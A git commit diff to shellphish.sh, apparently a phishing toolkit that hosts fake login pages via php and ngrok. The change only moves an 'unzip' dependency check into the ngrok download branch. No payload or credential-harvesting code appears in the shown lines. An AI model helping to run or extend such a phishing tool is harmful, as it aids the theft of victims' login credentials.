944071dfef32fbba6eba6a55f6b4240a87da7943
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2018-07-23 10:59:19 -0300

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -13,7 +13,6 @@ dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
 
 }
@@ -367,7 +366,7 @@ fi
 if [[ -e ngrok ]]; then
 echo ""
 else
-
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
